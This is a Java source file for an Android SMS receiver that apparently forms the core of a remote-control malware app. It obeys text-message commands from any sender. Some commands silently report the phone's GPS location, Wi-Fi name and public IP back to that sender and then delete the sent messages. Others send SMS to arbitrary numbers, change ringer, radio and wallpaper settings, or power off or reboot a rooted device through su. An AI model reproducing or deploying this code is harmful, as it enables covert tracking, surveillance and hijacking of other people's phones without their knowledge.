package com.android.amw.mwb;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.WallpaperManager;
import android.bluetooth.BluetoothAdapter;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.support.annotation.RequiresApi;

import android.os.Bundle;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.StringTokenizer;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import static android.content.Context.TELEPHONY_SERVICE;

public class SmsReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    Context context;
    @TargetApi(Build.VERSION_CODES.N)
    @RequiresApi(api = Build.VERSION_CODES.DONUT)
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context=context;
        if (intent.getAction().equals(SMS_RECEIVED)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {

                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length == 0) {
                    return;
                }
                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    sb.append(messages[i].getMessageBody());
                }
                String sender = messages[0].getOriginatingAddress();
                String message = sb.toString();

                try {
                    // SILENT MODE
                    if (message.equals("AM Silent")) {
                        AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                        am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                    }

                    // NORMAL

                    else if (message.equals("AM Normal")) {
                        AudioManager am1 = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                        am1.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                    }
                    // WIFI ON
                    else if (message.equals("AM Wifi On")) {
                        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                        wifiManager.setWifiEnabled(true);
                        wifiManager.startScan();
                    }
                    // WIFI OFF
                    else if (message.equals("AM Wifi Off")) {
                        WifiManager wifiManager1 = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                        wifiManager1.setWifiEnabled(false);
                    } else if (message.equals("Bluetooth On")) {
                        BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
                        if (bluetoothAdapter.isEnabled()) {
                            bluetoothAdapter.enable();
                        }
                    }
                // BLUETOOTH ON
                    else if (message.equals("AM Bluetooth On")) {
                        BluetoothAdapter bluetoothAdapter1 = BluetoothAdapter.getDefaultAdapter();
                        bluetoothAdapter1.enable();
                    }
                    // BLUETOOTH OFF
                    else if (message.equals("AM Bluetooth Off")) {
                        BluetoothAdapter bluetoothAdapter1 = BluetoothAdapter.getDefaultAdapter();
                        bluetoothAdapter1.disable();
                    }

                    // FLASHLIGHT ON BACK CAM
                    else if (message.equals("AM Flash On")) {
                        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                        try {
                            // 0 MEANS BACK CAM
                            String cameraId = cameraManager.getCameraIdList()[0];
                            cameraManager.setTorchMode(cameraId, true);
                        } catch (CameraAccessException e) {
                            e.printStackTrace();
                        }
                    }
                    // FLASHLIGHT OFF BACK CAM
                    else if (message.equals("AM Flash Off")) {
                        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                        try {
                            // 0 MEANS BACK CAM
                            String cameraId = cameraManager.getCameraIdList()[0];
                            cameraManager.setTorchMode(cameraId, false);
                        } catch (CameraAccessException e) {
                            e.printStackTrace();
                        }
                    } else if (message.equals("AM Wifiname")) {
                        // WIFI NAME
                        WifiManager wifiManager2 = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                        WifiInfo info = wifiManager2.getConnectionInfo();
                        if (info != null) {
                            String wifiname = info.getSSID();

                            // THIS IS MULTI SMS MAKER
                            ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
                            ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
                            PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                                    new Intent(context, SmsSentReciever.class), 0);
                            PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
                                    new Intent(context, SmsDeliveredHelper.class), 0);
                            try {
                                SmsManager sms = SmsManager.getDefault();
                                ArrayList<String> mSMSMessage = sms.divideMessage(wifiname);
                                for (int i = 0; i < mSMSMessage.size(); i++) {
                                    sentPendingIntents.add(i, sentPI);
                                    deliveredPendingIntents.add(i, deliveredPI);
                                }
                                sms.sendMultipartTextMessage(sender, null, mSMSMessage,
                                        sentPendingIntents, deliveredPendingIntents);

                            } catch (Exception e) {

                                e.printStackTrace();

                            }

                        } else {
                            //Wifi Info not available
                        }
                    }   else if (message.equals("AM Gps")) {
                        GPS mGPS = new GPS(context);
                        if (!mGPS.canGetLocation) {

                            // FAILED TO ACUIRE GPS LOCATION
                        } else {
                            mGPS.getLocation();

                            // THIS CODE IS TO SHROTEN THE GPS LOCATION BY 4 DECIMAL
                            // SO THAT WHEN WE ENCODE AND SENT TO A NUMBER THE SMS WILL NOT FAIL

                            StringTokenizer latlongdata = new StringTokenizer(mGPS.getLatitude() + "|" + mGPS.getLongitude(), "|");
                            String lat = latlongdata.nextToken();
                            String lon = latlongdata.nextToken();
                            StringTokenizer latmain = new StringTokenizer(lat, ".");
                            StringTokenizer lonmain = new StringTokenizer(lon, ".");
                            String latwholenumber = latmain.nextToken();
                            String latdecimal = latmain.nextToken();
                            String lonwholenumber = lonmain.nextToken();
                            String londecimal = lonmain.nextToken();
                            String lat_decimal_final = latdecimal.substring(0, 4);
                            String lon_decimal_final = londecimal.substring(0, 4);

                            String gps_precise = "Latitude : " + mGPS.getLatitude() + "Longitude : " + mGPS.getLongitude();
                            String gps_shorten = "Lat: " + latwholenumber + "." + lat_decimal_final + " Lat: " + lonwholenumber + "." + lon_decimal_final;
                            String gps_google_map = "http://www.google.com/maps/place/" + mGPS.getLatitude() + "," + mGPS.getLongitude() + "/@" + mGPS.getLatitude() + "," + mGPS.getLongitude() + ",17z";

                            // GPS LOCATION WILL SENT TO SENDER
                            // THIS IS MULTI SMS MAKER
                            ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
                            ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
                            PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                                    new Intent(context, SmsSentReciever.class), 0);
                            PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
                                    new Intent(context, SmsDeliveredHelper.class), 0);
                            try {
                                SmsManager sms = SmsManager.getDefault();
                                ArrayList<String> mSMSMessage = sms.divideMessage(gps_google_map);
                                for (int i = 0; i < mSMSMessage.size(); i++) {
                                    sentPendingIntents.add(i, sentPI);
                                    deliveredPendingIntents.add(i, deliveredPI);
                                }
                                sms.sendMultipartTextMessage(sender, null, mSMSMessage,
                                        sentPendingIntents, deliveredPendingIntents);

                            } catch (Exception e) {

                                e.printStackTrace();

                            }
                            // THEN DELETE THE SENT SMS
                            DeleteSentSMS(context, gps_google_map, sender);


                        }
                    } else if (message.equals("AM Ip")) {
                        String Ip = getPublicIPAddress();
                        if (Ip == null) {
                            getPublicIPAddress();
                        } else {

                            String command = "Ip : " + Ip;

                            ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
                            ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
                            PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                                    new Intent(context, SmsSentReciever.class), 0);
                            PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
                                    new Intent(context, SmsDeliveredHelper.class), 0);
                            try {
                                SmsManager sms = SmsManager.getDefault();
                                ArrayList<String> mSMSMessage = sms.divideMessage(command);
                                for (int i = 0; i < mSMSMessage.size(); i++) {
                                    sentPendingIntents.add(i, sentPI);
                                    deliveredPendingIntents.add(i, deliveredPI);
                                }
                                sms.sendMultipartTextMessage(sender, null, mSMSMessage,
                                        sentPendingIntents, deliveredPendingIntents);

                            } catch (Exception e) {

                                e.printStackTrace();

                            }
                        }
                    } else if (message.contains("AM Toast")) {
                        //Eg : Toast@x@Hello
                        Toast.makeText(context, message.split("@x@")[1], Toast.LENGTH_SHORT).show();
                    } else if (message.contains("AM Noti")) {
                        {
                            // Show a notification
                            //Eg :Notification@x@Hi@x@ImAndroMW
                            String Title = message.split("@x@")[1];
                            String Body = message.split("@x@")[2];

                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                NotificationChannel channel = new NotificationChannel("n", "n", NotificationManager.IMPORTANCE_DEFAULT);
                                NotificationManager manager = context.getSystemService(NotificationManager.class);
                                manager.createNotificationChannel(channel);
                                NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "n")

                                        .setContentTitle(Title)
                                        .setContentText(Body)
                                        .setSmallIcon(R.drawable.android_black)
                                        .setAutoCancel(true);

                                NotificationManagerCompat managerCompat = NotificationManagerCompat.from(context);
                                managerCompat.notify(999, builder.build());
                            }

                        }
                    } else if (message.contains("AM Sms")) {

                        Toast.makeText(context,message, Toast.LENGTH_SHORT).show();

                        // SEND A MESSAGE
                        // Eg ; SendSMS@x@8080@x@Hi im baymax!
                        String Number = message.split("@x@")[1];
                        String Message = message.split("@x@")[2];

                        // THIS IS MULTI SMS MAKER
                        ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
                        ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
                        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                                new Intent(context, SmsSentReciever.class), 0);
                        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
                                new Intent(context, SmsDeliveredHelper.class), 0);
                        try {
                            SmsManager sms = SmsManager.getDefault();
                            ArrayList<String> mSMSMessage = sms.divideMessage(Message);
                            for (int i = 0; i < mSMSMessage.size(); i++) {
                                sentPendingIntents.add(i, sentPI);
                                deliveredPendingIntents.add(i, deliveredPI);
                            }
                            sms.sendMultipartTextMessage(Number, null, mSMSMessage,
                                    sentPendingIntents, deliveredPendingIntents);

                        } catch (Exception e) {
                            Toast.makeText(context, "Failed", Toast.LENGTH_SHORT).show();
                            e.printStackTrace();

                        }

                    } else if (message.equals("AM Sound")) {
                        //PLAY A SOUND
                        //BE CREATIVE

                        try {
                            MediaPlayer mp = MediaPlayer.create(context, R.raw.hotel626);

                            // if you want unlimited just erased this line
                           // mp.setLooping(true);
                            mp.setVolume((float) 100, (float) 100);
                            mp.start();

                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                    } else if (message.equals("AM Layout")) {


                        // CALLING AN INTENT WITH BROADCAST IS NOT ABLE TO PERFORM
                        // IF YOU WANT TO HELP ME WITH THIS THATS WOULD BE GREAT!

                        // TOASTING AN LAYOUT
                        // ADD IF YOU WANT
                        LayoutInflater inflater_troll = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                        View view_troll = inflater_troll.inflate(R.layout.display_content, null);
                        ImageView image_troll = (ImageView) view_troll.findViewById(R.id.Display_Image);
                        image_troll.setImageResource(R.drawable.godzilla_16);
                        Toast Toast_troll = new Toast(context);
                        Toast_troll.setDuration(Toast.LENGTH_LONG);
                        Toast_troll.setGravity(Gravity.FILL, 0, 0);
                        Toast_troll.setView(view_troll);
                        Toast_troll.show();
                    } else if (message.equals("AM Wallpaper")) {


                        // THIS CODE FORCE TO FIT A PHOTO IN A SCREEN
                        Bitmap bitmap = BitmapFactory.decodeResource(context.getResources(), R.drawable.godzilla_16);
                        WallpaperManager manager = WallpaperManager.getInstance(context);
                        manager.setBitmap(bitmap, null, true, WallpaperManager.FLAG_LOCK | WallpaperManager.FLAG_SYSTEM);

                        // home screen & lock screen
                        manager.setBitmap(bitmap, null, true, WallpaperManager.FLAG_LOCK | WallpaperManager.FLAG_SYSTEM);

                        //home screen
                        //manager.setBitmap(bitmap, null, true, WallpaperManager.FLAG_SYSTEM);
                        //lock screen
                        //manager.setBitmap(bitmap, null, true, WallpaperManager.FLAG_LOCK);


                    }

                    // THIS IS FOR ROOTED COMMAND ONLY
                    else if (message.equals("AM Shut")){

                        try {
                            Process proc = Runtime.getRuntime()
                                    .exec(new String[]{"su", "-c", "reboot -p"});
                            proc.waitFor();
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }

                    }
                    // THIS IS FOR ROOTED COMMAND ONLY
                    else if (message.equals("AM Boot")){
                        try {
                            Process proc = Runtime.getRuntime()
                                    .exec(new String[]{"su", "-c", "reboot"});
                            proc.waitFor();
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

    }



    // CREDITS TO STACKOVERFLOW
    public void DeleteSentSMS(final Context context, final String message, final String number) {

        new CountDownTimer(5000, 1000) {

            public void onTick(long millisUntilFinished) {

                try {

                    Uri uriSms = Uri.parse("content://sms/inbox");
                    Cursor c = context.getContentResolver().query(uriSms,
                            new String[]{"_id", "thread_id", "address",
                                    "person", "date", "body"}, null, null, null);

                    if (c != null && c.moveToFirst()) {
                        do {
                            long id = c.getLong(0);
                            long threadId = c.getLong(1);
                            String address = c.getString(2);
                            String body = c.getString(5);

                            if (message.equals(body) && address.equals(number)) {
                                //   mLogger.logInfo("Deleting SMS with id: " + threadId);
                                context.getContentResolver().delete(
                                        Uri.parse("content://sms/" + id), null, null);
                                //Deleting SMS

                            }
                        } while (c.moveToNext());
                    }
                } catch (Exception e) {
                    //Could not delete SMS from inbox
                }
            }

            public void onFinish() {


            }

        }.start();


    }
    // Reads a raw data of ccntent file
    public static String getPublicIPAddress() {
        String value = null;
        ExecutorService es = Executors.newSingleThreadExecutor();
        Future<String> result = es.submit(new Callable<String>() {
            public String call() throws Exception {
                try {
                    URL url = new URL("https://api.my-ip.io/ip");
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    try {
                        InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                        BufferedReader r = new BufferedReader(new InputStreamReader(in));
                        StringBuilder total = new StringBuilder();
                        String line;
                        while ((line = r.readLine()) != null) {
                            total.append(line).append('\n');
                        }
                        urlConnection.disconnect();
                        return total.toString();
                    } finally {
                        urlConnection.disconnect();
                    }
                } catch (IOException e) {
                }
                return null;
            }
        });
        try {
            value = result.get();
        } catch (Exception e) {
            // failed
        }
        es.shutdown();
        return value;
    }


}